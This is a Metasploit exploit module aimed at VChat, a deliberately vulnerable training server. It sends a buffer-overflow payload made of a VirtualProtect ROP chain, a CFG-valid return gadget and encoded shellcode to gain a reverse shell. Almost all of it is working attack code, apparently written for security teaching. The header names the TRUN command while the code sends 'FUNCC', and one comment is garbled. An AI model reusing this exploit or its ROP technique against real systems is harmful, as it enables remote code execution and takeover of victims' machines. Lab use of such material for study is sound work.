##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
# File path: /usr/share/metasploit-framework/modules/exploit/windows/VChat/TRUN_ROP.rb
##
# This module exploits the TRUN command of vulnerable chat server
##
class MetasploitModule < Msf::Exploit::Remote   # This is a remote exploit module inheriting from the remote exploit class
  Rank = NormalRanking        # Potential impact to the target
  include Msf::Exploit::Remote::Tcp   # Include remote tcp exploit module

  def initialize(info = {})   # i.e. constructor, setting the initial values
    super(update_info(info,
      'Name'           => 'VChat/Vulnserver Buffer Overflow-TRUN command',    # Name of the target
      'Description'    => %q{ # Explaining what the module does
         This module exploits a buffer overflow in an Vulnerable By Design (VBD) server to gain a reverse shell. 
      },
      'Author'         => [ 'fxw' ],  ## Hacker name
      'License'        => MSF_LICENSE,
      'References'     =>     # References for the vulnerability or exploit
        [
          #[ 'URL', 'https://github.com/DaintyJet/Making-Dos-DDoS-Metasploit-Module-Vulnserver/'],
          [ 'URL', 'https://github.com/DaintyJet/VChat_CFG' ]

        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread', # Run the shellcode in a thread and exit the thread when it is done
        },
      'Payload'        =>     # How to encode and generate the payload
        {
          'BadChars' => "\x00\x0a\x0d"        # Bad characters to avoid in generated shellcode
        },
      'Platform'       => 'Win',      # Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
      'Targets'        =>     #  targets for many exploits
      [
        [ 'gadget',
          {
            # Likely bad practice, but this changes between attempts and is therefore not used
            # As it is not so straightforward to modify.
            'popgadget' => 0x0015499A # This will be available in [target['popgadget']]
          }
        ]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar. 30, 2022'))   # When the vulnerability was disclosed in public
      register_options( # Available options: CHOST(), CPORT(), LHOST(), LPORT(), Proxies(), RHOST(), RHOSTS(), RPORT(), SSLVersion()
          [
          OptInt.new('RETOFFSET', [true, 'Offset of Return Address in function', 792]),
          OptString.new('CFG_ROP_GADGET', [true, 'Integer set for ROP Gadget Return Address. This MUST be from a CFG enabled module, must be HEX.', "0x0015499A"]),
          Opt::RPORT(9999),
          Opt::RHOSTS('192.168.7.191')
      ])
  end
  def create_rop_chain()
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets =
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x77a23bf0,  # POP EBX # RETN [ucrtbase.dll] ** REBASED ** ASLR
      0x76db1548,  # ptr to &VirtualProtect() [IAT KERNEL32.DLL] ** REBASED ** ASLR
      0x76f83a91,  # MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN [OLEAUT32.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebp:---]
      0x77ae40e5,  # POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR
      0x77a577c5,  # & push esp # ret  [ucrtbase.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x7621a740,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x76d554c8,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR
      0x77a0b2d6,  # XCHG EAX,EBX # RETN [ucrtbase.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edx:---]
      0x761dbacc,  # POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76410daa,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR
      0x77d1a5ca,  # XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ecx:---]
      0x777cce18,  # POP ECX # RETN [msvcp_win.dll] ** REBASED ** ASLR
      0x77b04e93,  # &Writable location [ucrtbase.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x7517e905,  # POP EDI # RETN [VCRUNTIME140.dll] ** REBASED ** ASLR
      0x76d79906,  # RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x76716ed9,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x76fdb774,  # PUSHAD # RETN [OLEAUT32.dll] ** REBASED ** ASLR
    ].flatten.pack("V*")
    return rop_gadgets
  end
  def exploit # Actual exploit
    print_status("Connecting to target...")
    connect   # Connect to the target
    hex_string = datastore['CFG_ROP_GADGET']
    hex_string = hex_string.start_with?('0x') ? hex_string[2..-1] : hex_string
    hex_string = hex_string.to_i(16)

    shellcode = payload.encoded       # Generated and encoded shellcodelen(create_rop_chain()) + len(SHELL) + buff)
    rop_chain = create_rop_chain()
    outbound = 'FUNCC /.' + rop_chain + "\x90" * 8 + shellcode + "A"*(datastore['RETOFFSET'] - (rop_chain.length + 8 + shellcode.length())) + [hex_string].pack('V') # Create the malicious string that will be sent to the target

    print_status("Sending Exploit")
    sock.put(outbound)        # Send the attacking payload

    disconnect        # disconnect the connection
  end
end
